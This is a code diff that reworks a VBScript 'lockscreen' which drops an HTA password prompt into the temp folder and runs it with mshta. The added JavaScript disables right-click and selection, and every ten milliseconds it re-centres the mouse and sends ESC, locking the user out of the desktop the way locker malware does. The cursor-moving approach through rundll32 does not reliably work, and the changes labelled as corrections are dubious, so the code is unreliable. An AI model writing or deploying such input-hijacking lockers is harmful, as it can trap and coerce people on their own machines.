@@ -1,11 +1,11 @@
-' lockscreen_single.vbs
+' lockscreen_corrected.vbs
 Option Explicit
 
 Dim fso, shell, htaPath, htaText
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set shell = CreateObject("WScript.Shell")
 
-htaPath = fso.GetSpecialFolder(2) & "\lockscreen.hta" ' Temporary HTA in temp folder
+htaPath = fso.GetSpecialFolder(2) & "\lockscreen.hta" ' Temp HTA
 
 ' Create HTA content
 htaText = _
@@ -31,10 +31,32 @@ htaText = _
 "            End If" & vbCrLf & _
 "        End Sub" & vbCrLf & _
 "    </script>" & vbCrLf & _
+"    <script language=""JavaScript"">" & vbCrLf & _
+"        var pwInput = document.getElementById('pw');" & vbCrLf & _
+"        var isTyping = false;" & vbCrLf & _
+"        pwInput.addEventListener('focus', function(){ isTyping=true; });" & vbCrLf & _
+"        pwInput.addEventListener('blur', function(){ isTyping=false; });" & vbCrLf & _
+"        window.onload = function(){ pwInput.focus(); };" & vbCrLf & _
+"        document.oncontextmenu = function(){ return false; };" & vbCrLf & _
+"        document.onselectstart = function(){ return false; };" & vbCrLf & _
+"        function centerMouse() {" & vbCrLf & _
+"            if(!isTyping){" & vbCrLf & _
+"                try {" & vbCrLf & _
+"                    var shell = new ActiveXObject('WScript.Shell');" & vbCrLf & _
+"                    var screenWidth = screen.width;" & vbCrLf & _
+"                    var screenHeight = screen.height;" & vbCrLf & _
+"                    shell.Run('rundll32 user32.dll,SetCursorPos ' + (screenWidth/2) + ',' + (screenHeight/2),0,false);" & vbCrLf & _
+"                    shell.SendKeys('{ESC}');" & vbCrLf & _
+"                } catch(e){}" & vbCrLf & _
+"            }" & vbCrLf & _
+"            setTimeout(centerMouse,10);" & vbCrLf & _
+"        }" & vbCrLf & _
+"        centerMouse();" & vbCrLf & _
+"    </script>" & vbCrLf & _
 "</body>" & vbCrLf & _
 "</html>"
 
-' Write HTA file
+' Write HTA
 If fso.FileExists(htaPath) Then fso.DeleteFile htaPath, True
 Dim htaFile
 Set htaFile = fso.CreateTextFile(htaPath, True, False)
@@ -42,46 +64,5 @@ htaFile.Write htaText
 htaFile.Close
 Set htaFile = Nothing
 
-' Launch HTA non-blocking
+' Launch HTA
 shell.Run "mshta.exe """ & htaPath & """", 1, False
-
-' ESC + mouse lock loop
-Dim wmi, procEnum, proc, found
-Set wmi = GetObject("winmgmts:\\.\root\cimv2")
-WScript.Sleep 200
-
-Do
-    found = False
-    Set procEnum = wmi.ExecQuery("SELECT ProcessId, CommandLine FROM Win32_Process WHERE Name='mshta.exe'")
-    For Each proc In procEnum
-        If Not IsNull(proc.CommandLine) Then
-            If InStr(LCase(proc.CommandLine), LCase(htaPath)) > 0 Then
-                found = True
-                Exit For
-            End If
-        End If
-    Next
-
-    If Not found Then Exit Do
-
-    ' Center mouse
-    Call SetCursorPosToCenter() ' <-- corrected usage of Call with parentheses
-
-    ' Blast ESC
-    shell.SendKeys "{ESC}"
-
-    WScript.Sleep 10
-Loop
-
-' Cleanup HTA
-If fso.FileExists(htaPath) Then fso.DeleteFile(htaPath, True)
-
-' ---------------------------
-Sub SetCursorPosToCenter()
-    Dim screenWidth, screenHeight, centerX, centerY
-    screenWidth = 1920
-    screenHeight = 1080
-    centerX = screenWidth \ 2
-    centerY = screenHeight \ 2
-    shell.Run "rundll32 user32.dll,SetCursorPos " & centerX & "," & centerY, 0, False
-End Sub
